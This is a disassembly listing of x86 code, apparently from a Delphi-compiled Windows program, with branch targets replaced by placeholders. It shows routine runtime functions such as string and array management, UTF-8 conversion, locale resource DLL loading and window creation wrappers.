add esi 0x4
dec ebp
jne r-xdata
cmp cl 0xc
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn 0x4
jmp r-xdata
mov eax ebx
mov edx esi
call sub_404b04
add ebx 0x10
add esi 0x10
dec ebp
jne r-xdata
cmp cl 0xd
je r-xdata
jmp r-xdata
xor ecx ecx
mov cl [ edi + 0x1 ]
lea edi [ ecx + edi + 0x2 ]
cmp cl 0xe
je r-xdata
mov eax ebx
mov edx esi
mov ecx [ edi + 0x8 ]
push [ edi + 0x4 ]
call sub_404c38
add ebx [ edi ]
add esi [ edi ]
dec ebp
jne r-xdata
jmp r-xdata
mov eax ebx
mov edx esi
mov ecx edi
call sub_404b1c
xor eax eax
mov al [ edi + 0x1 ]
add ebx [ eax + edi + 0x2 ]
add esi [ eax + edi + 0x2 ]
dec ebp
jne r-xdata
cmp cl 0xf
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
call sub_4055e4
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0x11
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
mov ecx edi
call sub_404f5c
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
mov al 0x2
pop ebp
pop edi
pop esi
pop ebx
jmp sub_402818
sub_404d34
push edx
push eax
mov eax [ esp + 0x10 ]
mul [ esp ]
mov ecx eax
mov eax [ esp + 0x4 ]
mul [ esp + 0xc ]
add ecx eax
mov eax [ esp ]
mul [ esp + 0xc ]
add edx ecx
pop ecx
pop ecx
retn 0x8
sub_404d88
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx ]
mov eax [ ebp + 0x8 ]
mov edi [ eax ]
test edi edi
jg r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
test ebx ebx
je r-xdata
test edi edi
jge r-xdata
xor eax eax
mov al [ esi + 0x1 ]
add esi eax
mov eax esi
mov edx [ eax + 0x2 ]
mov [ ebp - 0x18 ] edx
mov edx [ eax + 0x6 ]
test edx edx
je r-xdata
sub ebx 0x4
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
sub ebx 0x4
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_404d80
jmp r-xdata
mov al 0x4
call sub_402818
xor esi esi
mov esi [ edx ]
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebp - 0x1c ] 0x8
test ebx ebx
je r-xdata
mov al 0x4
call sub_402818
mov eax edi
imul [ ebp - 0x18 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x1c ]
cdq
idiv edi
cmp eax [ ebp - 0x18 ]
je r-xdata
mov [ ebp - 0x20 ] ebx
cmp edi [ ebp - 0x10 ]
jge r-xdata
cmp [ ebx ] 0x1
jne r-xdata
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0x1c ]
call sub_4026fc
mov ebx [ ebp - 0x20 ]
jmp r-xdata
test esi esi
je r-xdata
dec [ ebx ]
mov eax [ ebp - 0x1c ]
call sub_4026bc
mov ebx eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
cmp edi [ ebp - 0x14 ]
jge r-xdata
mov [ ebx ] 0x1
add ebx 0x4
mov [ ebx ] edi
add ebx 0x4
mov edx edi
sub edx [ ebp - 0x10 ]
imul edx [ ebp - 0x18 ]
mov eax [ ebp - 0x18 ]
imul eax [ ebp - 0x10 ]
add eax ebx
xor ecx ecx
call sub_402c64
cmp [ ebp - 0x8 ] 0x1
jle r-xdata
mov eax ebx
add eax 0x8
mov edx edi
imul edx [ ebp - 0x18 ]
add eax edx
mov ecx [ ebp - 0x10 ]
sub ecx edi
mov edx esi
call j_sub_404a0c
test esi esi
je r-xdata
mov [ ebp - 0x14 ] edi
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
add [ ebp + 0x8 ] 0x4
dec [ ebp - 0x8 ]
dec edi
test edi edi
jl r-xdata
mov ecx [ ebp - 0x14 ]
imul ecx [ ebp - 0x18 ]
mov edx ebx
add edx 0x8
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_4028b8
mov edx [ ebp - 0x14 ]
imul edx [ ebp - 0x18 ]
mov eax ebx
add eax 0x8
xor ecx ecx
call sub_402c64
mov eax [ ebp - 0x14 ]
push eax
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov eax ebx
add eax 0x8
mov ecx esi
call sub_404d68
jmp r-xdata
inc edi
mov [ ebp - 0xc ] 0x0
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0xc ]
lea eax [ ebx + eax * 4 ]
mov ecx [ ebp - 0x8 ]
mov edx esi
call sub_404d88
inc [ ebp - 0xc ]
dec edi
jne r-xdata
sub_404f20
mov ecx [ eax ]
test ecx ecx
je r-xdata
retn
mov [ eax ] 0x0
[ ecx - 0x8 ]
jne r-xdata
push eax
mov eax ecx
xor ecx ecx
mov cl [ edx + 0x1 ]
mov edx [ ecx + edx + 0x6 ]
test edx edx
je r-xdata
sub eax 0x8
call sub_4026dc
pop eax
mov ecx [ eax - 0x4 ]
test ecx ecx
je r-xdata
mov edx [ edx ]
call sub_404a0c
sub_404f5c
push ebx
mov ebx [ eax ]
test edx edx
je r-xdata
test ebx ebx
je r-xdata
[ edx - 0x8 ]
mov [ eax ] edx
pop ebx
retn
[ ebx - 0x8 ]
jne r-xdata
push eax
push edx
mov edx ecx
inc [ ebx - 0x8 ]
call sub_404f20
pop edx
pop eax
sub_404f84
add esp 0xffffffe4
push 0x1c
lea edx [ esp + 0x4 ]
push edx
push eax
call sub_4012cc
cmp [ esp + 0x10 ] 0x1000
jne r-xdata
xor eax eax
mov eax [ esp + 0x4 ]
jmp r-xdata
add esp 0x1c
retn
sub_404fb4
push ebx
push esi
add esp 0xfffffef8
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov eax [ ebx + 0x10 ]
add esp 0x108
pop esi
pop ebx
retn
push 0x105
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call sub_40125c
mov eax esp
mov dl 0x1
call sub_4051f0
mov esi eax
mov [ ebx + 0x10 ] esi
test esi esi
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ ebx + 0x10 ] eax
sub_404ffc
mov edx [ rw-data ]
test edx edx
je r-xdata
retn
cmp eax [ edx + 0x4 ]
je r-xdata
mov eax edx
call sub_404fb4
retn
cmp eax [ edx + 0x8 ]
je r-xdata
cmp eax [ edx + 0xc ]
jne r-xdata
mov edx [ edx ]
test edx edx
jne r-xdata
sub_405038
push ebp
mov ebp esp
add esp 0xfffffdb0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
push r-xdata
call sub_401264
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x5c
jne r-xdata
push r-xdata
push esi
call sub_40126c
mov ebx eax
test ebx ebx
je r-xdata
mov esi [ ebp - 0x4 ]
add esi 0x2
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1 ] 0x5c
jne r-xdata
push 0x105
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call ebx
test eax eax
je r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
add eax 0x2
call sub_405024
mov esi eax
cmp [ esi ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call lstrcpynA
jmp r-xdata
lea eax [ esi + 0x1 ]
call sub_405024
mov edi eax
mov eax edi
sub eax esi
mov edx eax
add edx ebx
inc edx
cmp edx 0x105
jg r-xdata
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call lstrcpynA
lea eax [ esi + 0x1 ]
call sub_405024
mov esi eax
cmp [ esi ] 0x0
je r-xdata
inc eax
push eax
push esi
lea eax [ ebp - 0x24f ]
add eax ebx
push eax
call lstrcpynA
lea eax [ ebp - 0x14a ]
push eax
lea eax [ ebp - 0x24f ]
push eax
call FindFirstFileA
mov esi eax
cmp esi 0xffffffff
je r-xdata
jmp r-xdata
push esi
call FindClose
lea eax [ ebp - 0x11e ]
push eax
call lstrlenA
lea edx [ ebx + 0x1 ]
add eax edx
inc eax
cmp eax 0x105
jg r-xdata
mov ebx esi
sub ebx [ ebp - 0x4 ]
lea eax [ ebx + 0x1 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
call lstrcpynA
jmp r-xdata
mov [ ebp + ebx - 0x24f ] 0x5c
mov eax 0x105
sub eax ebx
dec eax
push eax
lea eax [ ebp - 0x11e ]
push eax
lea eax [ ebp - 0x24f ]
add eax ebx
inc eax
push eax
call lstrcpynA
lea eax [ ebp - 0x11e ]
push eax
call lstrlenA
inc eax
add ebx eax
mov esi edi
sub_4051f0
push ebp
mov ebp esp
add esp 0xfffffee0
push ebx
push esi
mov [ ebp - 0x4 ] eax
push 0x105
lea eax [ ebp - 0x11d ]
push eax
push 0x0
call sub_40125c
mov [ ebp - 0x12 ] 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000001
call sub_4012b4
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_4052f5
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x18 ] 0x5
lea eax [ ebp - 0x11d ]
mov edx 0x105
call sub_405038
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x12 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x11d ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call sub_4012bc
test eax eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000002
call sub_4012b4
test eax eax
je r-xdata
mov [ ebp - 0xe ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call sub_4012ac
retn
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x12 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call sub_4012bc
test eax eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000001
call sub_4012b4
test eax eax
jne r-xdata
mov [ ebp - 0x12 ] 0x0
push 0x105
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x11d ]
push eax
call lstrcpynA
push 0x5
lea eax [ ebp - 0xd ]
push eax
push 0x3
call sub_40127c
push eax
call sub_401254
xor esi esi
cmp [ ebp - 0x11d ] 0x0
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0xd ] 0x0
jne r-xdata
lea eax [ ebp - 0x11d ]
push eax
call lstrlenA
mov ebx eax
lea eax [ ebp - 0x11d ]
add ebx eax
jmp r-xdata
cmp [ ebp - 0x12 ] 0x0
je r-xdata
cmp [ ebx ] 0x2e
je r-xdata
lea eax [ ebp - 0x11d ]
cmp ebx eax
je r-xdata
lea eax [ ebp - 0x11d ]
cmp ebx eax
jne r-xdata
inc ebx
cmp [ ebp - 0x12 ] 0x0
je r-xdata
dec ebx
test esi esi
jne r-xdata
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0x12 ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
cmp [ ebp - 0xd ] 0x0
je r-xdata
lea eax [ ebp - 0x11d ]
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0xd ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
test esi esi
jne r-xdata
mov [ ebp - 0xb ] 0x0
lea eax [ ebp - 0x11d ]
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0xd ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
sub_405490
push ebx
push esi
mov esi [ rw-data ]
test esi esi
je r-xdata
mov edx esi
test edx edx
je r-xdata
mov edx [ esi + 0x4 ]
cmp edx eax
jne r-xdata
pop esi
pop ebx
retn
mov ecx [ edx ]
test ecx ecx
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ rw-data ] eax
mov edx 0x8
mov eax esi
call sub_4026dc
pop esi
pop ebx
retn
mov edx [ edx ]
test edx edx
jne r-xdata
mov ebx [ ecx + 0x4 ]
cmp ebx eax
jne r-xdata
mov esi ecx
mov eax [ ecx ]
mov [ edx ] eax
mov edx 0x8
mov eax esi
call sub_4026dc
jmp r-xdata
sub_4054f0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
xor eax eax
push ebp
push sub_40552b
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebx + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
sub_40555c
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_4055c0
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4054f0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4055c7
mov eax [ ebp - 0x4 ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov [ rw-data ] eax
jmp r-xdata
retn
mov edx [ eax ]
cmp edx [ ebp - 0x4 ]
jne r-xdata
mov eax [ eax ]
test eax eax
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov [ eax ] edx
jmp r-xdata
sub_4055e4
test edx edx
je r-xdata
mov ecx [ eax ]
test ecx ecx
mov [ eax ] edx
je r-xdata
push edx
push eax
mov eax [ edx ]
push edx
call [ eax + 0x4 ]
pop eax
mov ecx [ eax ]
pop [ eax ]
test ecx ecx
jne r-xdata
retn
mov eax [ ecx ]
push ecx
call [ eax + 0x8 ]
mov eax [ ecx ]
push ecx
call [ eax + 0x8 ]
retn
retn
sub_405610
test edx edx
je sub_4055cc
push edi
mov edi eax
push 0x0
push esp
push ecx
push edx
mov eax [ edx ]
call [ eax ]
test eax eax
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
mov al 0x17
jmp sub_402818
pop eax
mov [ edi ] eax
pop edi
retn
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
sub_4056b4
push ebp
mov ebp esp
push ebx
push esi
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x4 ]
push eax
call InterlockedDecrement
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x4 ]
sub_4056dc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
xor edx edx
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax edx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
xor esi esi
xor ecx ecx
test eax eax
je r-xdata
cmp ecx [ ebp + 0x8 ]
jae r-xdata
jmp r-xdata
lea edx [ esi + 0x1 ]
mov eax [ ebp - 0x8 ]
movzx edx [ eax + ecx * 2 ]
inc ecx
cmp edx 0x7f
jbe r-xdata
cmp ecx [ ebp + 0x8 ]
jae r-xdata
inc esi
cmp ecx [ ebp + 0x8 ]
jb r-xdata
cmp edx 0x7ff
jbe r-xdata
cmp esi [ ebp - 0x4 ]
jb r-xdata
cmp esi [ ebp - 0x4 ]
jb r-xdata
inc esi
inc esi
mov [ eax + esi ] 0x0
jmp r-xdata
mov esi [ ebp - 0x4 ]
dec esi
mov edx [ ebp - 0x8 ]
movzx edx [ edx + ecx * 2 ]
inc ecx
cmp edx 0x7f
ja r-xdata
cmp edx 0x7ff
jbe r-xdata
mov [ eax + esi ] dl
inc esi
jmp r-xdata
lea ebx [ esi + 0x2 ]
cmp ebx [ ebp - 0x4 ]
ja r-xdata
lea ebx [ esi + 0x3 ]
cmp ebx [ ebp - 0x4 ]
ja r-xdata
mov ebx edx
shr ebx 0x6
or bl 0xc0
mov [ eax + esi ] bl
and dl 0x3f
or dl 0x80
mov [ eax + esi + 0x1 ] dl
add esi 0x2
mov ebx edx
shr ebx 0xc
or bl 0xe0
mov [ eax + esi ] bl
mov ebx edx
shr ebx 0x6
and bl 0x3f
or bl 0x80
mov [ eax + esi + 0x1 ] bl
and dl 0x3f
or dl 0x80
mov [ eax + esi + 0x2 ] dl
add esi 0x3
jmp r-xdata
sub_4057b8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov [ ebp - 0x10 ] 0xffffffff
xor eax eax
xor esi esi
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
inc eax
mov [ ebp - 0x10 ] eax
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
test dl 0x80
je r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
inc eax
cmp esi [ ebp + 0x8 ]
jb r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
cmp eax [ ebp - 0x8 ]
jb r-xdata
cmp eax [ ebp - 0x8 ]
jb r-xdata
and dl 0x3f
test dl 0x20
je r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + eax * 2 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x8 ]
dec eax
mov edx [ ebp - 0xc ]
xor ecx ecx
mov cl [ edx + esi ]
inc esi
test cl 0x80
je r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
and dl 0xc0
cmp dl 0x80
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
and dl 0xc0
cmp dl 0x80
jne r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + eax * 2 ] cx
cmp esi [ ebp + 0x8 ]
jae r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
and ecx 0x3f
test cl 0x20
je r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
mov ebx edx
and bl 0xc0
cmp bl 0x80
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
mov ebx edx
and bl 0xc0
cmp bl 0x80
jne r-xdata
and dl 0x3f
and edx 0xff
shl ecx 0x6
or dx cx
mov ecx [ ebp - 0x4 ]
mov [ ecx + eax * 2 ] dx
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
inc eax
and dl 0x3f
and edx 0xff
shl ecx 0x6
or edx ecx
mov ecx edx
sub_4058f0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40598f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_403f90
mov eax ebx
xor edx edx
call sub_4047e8
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405996
lea eax [ ebp - 0x4 ]
call sub_403f90
retn
mov eax ebx
call sub_4047dc
lea edx [ eax + eax * 2 ]
lea eax [ ebp - 0x4 ]
call sub_4045dc
mov eax ebx
call sub_4047dc
push eax
mov eax [ ebp - 0x4 ]
call sub_404250
inc eax
push eax
mov eax ebx
call sub_4047cc
push eax
mov eax [ ebp - 0x4 ]
call sub_404450
pop ecx
pop edx
call sub_4056dc
test eax eax
jle r-xdata
lea eax [ ebp - 0x4 ]
call sub_403f90
mov edx eax
dec edx
lea eax [ ebp - 0x4 ]
call sub_4045dc
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_403fe4
sub_40599c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_405a33
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_404670
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405a3a
lea eax [ ebp - 0x4 ]
call sub_404670
retn
mov eax ebx
call sub_404250
mov edx eax
lea eax [ ebp - 0x4 ]
call sub_4048b8
mov eax ebx
call sub_404250
push eax
mov eax [ ebp - 0x4 ]
call sub_4047dc
inc eax
push eax
mov eax ebx
call sub_404450
push eax
mov eax [ ebp - 0x4 ]
call sub_4047cc
pop ecx
pop edx
call sub_4057b8
test eax eax
jle r-xdata
lea eax [ ebp - 0x4 ]
call sub_404670
mov edx eax
dec edx
lea eax [ ebp - 0x4 ]
call sub_4048b8
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_4046ac
sub_405a40
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_405a83
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_4047bc
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_4058f0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405a8a
lea eax [ ebp - 0x4 ]
call sub_404670
retn
sub_405a90
push ebx
push esi
add esp 0xfffffc00
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
add esp 0x400
pop esi
pop ebx
retn
cmp [ ebx + 0x4 ] 0x10000
jge r-xdata
mov eax esi
mov edx [ ebx + 0x4 ]
call sub_404188
push 0x400
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx ]
mov eax [ eax ]
call sub_404ffc
push eax
call sub_40128c
mov ecx eax
mov edx esp
mov eax esi
call sub_404080
jmp r-xdata
sub_405ae8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
xor edx edx
push ebp
push sub_405b4e
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x7
lea edx [ ebp - 0xb ]
push edx
push 0x1004
push eax
call sub_401254
lea eax [ ebp - 0x10 ]
lea edx [ ebp - 0xb ]
mov ecx 0x7
call sub_404200
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0x4 ]
call sub_402c84
mov ebx eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405b55
lea eax [ ebp - 0x10 ]
call sub_403f90
retn
xor ebx ebx
sub_405b5c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_405ba6
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405bad
retn
mov eax rw-data
call sub_402afc
mov eax rw-data
call sub_402afc
mov eax rw-data
call sub_402afc
call sub_401ac0
sub_405bb0
sub [ rw-data ] 0x1
jae r-xdata
retn
mov [ rw-data ] 0x2
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] 0x2
mov [ rw-data ] sub_404d2c
call sub_403090
test al al
je r-xdata
call sub_403184
mov [ rw-data ] 0xd7b0
mov [ rw-data ] 0xd7b0
mov [ rw-data ] 0xd7b0
call GetCommandLineA
mov [ rw-data ] eax
call sub_40130c
mov [ rw-data ] eax
call sub_401304
and eax 0x80000000
cmp eax 0x80000000
je r-xdata
call sub_4030c0
call sub_40127c
call sub_405ae8
mov [ rw-data ] eax
call sub_401304
and eax 0xff
cmp ax 0x4
jbe r-xdata
call sub_40127c
call sub_405ae8
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] 0x3
jmp r-xdata
call sub_4012fc
mov [ rw-data ] eax
sub_405cb8
push ebx
call sub_405cb0
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
cmp [ rw-data ] 0xffffffff
jne r-xdata
mov eax ebx
call sub_405ca4
test eax eax
jne r-xdata
mov eax 0xe2
call sub_403f84
push eax
mov eax [ rw-data ]
push eax
call TlsSetValue
mov eax 0xe2
call sub_403f84
sub_405cfc
mov cl [ rw-data ]
mov eax [ rw-data ]
test cl cl
jne r-xdata
push eax
call TlsGetValue
test eax eax
je r-xdata
mov edx [ fs : 0x2c ]
mov eax [ edx + eax * 4 ]
retn
call sub_405cb8
mov eax [ rw-data ]
push eax
call TlsGetValue
test eax eax
je r-xdata
retn
mov eax [ rw-data ]
retn
retn
sub_405d48
push ebx
mov ebx eax
xor eax eax
mov [ rw-data ] eax
push 0x0
call sub_405c84
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
call sub_405d3c
mov edx rw-data
mov eax ebx
call sub_403cd8
pop ebx
retn
sub_405d8c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_405db1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405db8
retn
sub_405de8
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] edx
add ecx eax
mov [ ebx + 0x8 ] ecx
add edx [ ebp + 0xc ]
mov [ ebx + 0xc ] edx
pop ebx
pop ebp
retn 0x8
sub_405e04
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_405e29
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405e30
retn
sub_4068e4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
call sub_402a54
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
push esi
call CreateWindowExA
mov esi eax
mov eax ebx
call sub_402a44
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x24
sub_40693c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
call sub_402a54
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
push esi
push 0x0
call CreateWindowExA
mov esi eax
mov eax ebx
call sub_402a44
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x20
sub_406994
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
push r-xdata
push r-xdata
call FindWindowA
mov ebx eax
push r-xdata
call RegisterWindowMessageA
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
push r-xdata
call RegisterWindowMessageA
mov [ esi ] eax
push r-xdata
call RegisterWindowMessageA
mov [ edi ] eax
cmp [ esi ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
xor edx edx
mov [ eax ] edx
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x3
test ebx ebx
je r-xdata
push 0x0
push 0x0
mov eax [ esi ]
push eax
push ebx
call SendMessageA
mov edx [ ebp + 0xc ]
mov [ edx ] eax
jmp r-xdata
push 0x0
push 0x0
mov eax [ edi ]
push eax
push ebx
call SendMessageA
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
cmp [ edi ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
